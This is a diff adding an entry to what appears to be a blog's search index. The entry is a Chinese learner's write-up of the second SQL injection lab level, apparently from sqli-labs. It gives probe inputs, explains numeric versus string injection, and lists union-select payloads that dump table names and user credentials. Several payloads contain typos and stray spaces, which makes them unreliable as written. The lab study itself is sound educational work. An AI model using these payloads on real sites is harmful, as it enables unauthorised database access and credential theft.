@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>sql闯关2</title>
+      <link href="test11/undefined-undefined.html"/>
+      <url>test11/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>这个第二关就是第一关的一个变形。  </p><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p>打开界面，按照流程先来判断注入类型。  </p><blockquote><p>?id=1 and 1=1<br>?id=1 and 1=2<br>?id=1’ and ‘1’=’1<br>?id=1’ amd ‘1’=’2</p></blockquote><p>在做这道题之前没有发现为什么要判断这个注入类型，因为看到别人用的语句没有什么变化，但是这道题让我知道二者还是有区别的。详细还是看这篇文章吧。<br><a href="https://blog.csdn.net/yujia_666/article/details/90296495?ops_request_misc=&request_id=&biz_id=102&utm_term=%25E4%25B8%25BA%25E4%25BB%2580%25E4%25B9%2588sql%25E6%25B3%25A8%25E5%2585%25A5%25E8%25A6%2581%25E4%25BD%25BF%25E7%2594%25A8%25E5%258D%2595%25E5%25BC%2595%25E5%258F%25B7&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-90296495.first_rank_v2_pc_rank_v29">sql注入基础原理（超详细)</a><br>简而言之，当是数字型注入时，后台执行的sql语句在id=1后面和句子后面是没有<strong>“</strong>‘<strong>”</strong>的，这也就是说，我们不需要构建payload时在结<br>尾加上注释符号#或者–+了。其余的和字符型注入相比没什么变化。  </p><hr><p><strong>数字型注入后台执行的sql语句</strong></p><blockquote><p>select * from &lt;表名&gt; where id = x and 1=1</p></blockquote><p><strong>字符型注入后台执行的sql语句</strong></p><blockquote><p>select * from &lt;表名&gt; where id = ‘x’ and ‘1’=’1’</p></blockquote><hr><p>接下来按照流程就行了。<br>爆库名和表名 </p><blockquote><p>?id=1’ union select 1,(select group _concat(table _name) from information _schema.tables where table _  schema=’security’),database()–+</p></blockquote><p>爆字段名  </p><blockquote><p>?id=1’ union select 1,(select group _concat(table _name) from information _schema.tables where table _  schema=’security’),(select group _concat(table _name) from information _schema.tables where table _  schema=’security’)</p></blockquote><p>爆字段信息  </p><blockquote><p>select group_ concat(username) from security.users<br>select group_ concat(password) from security.users</p></blockquote><hr><p>这道题算是进一步让我明白数字型注入和字符型注入了。<br>其实关于sql注入，其实也就是利用对输入字符的筛选漏洞来执行一些恶意的sql语句。sql语句不难学，主要还是如何找到它筛选的漏洞和如何绕过他们的筛选。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test11 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>寒假练习6</title>
       <link href="test10/undefined-undefined.html"/>
       <url>test10/undefined-undefined.html</url>
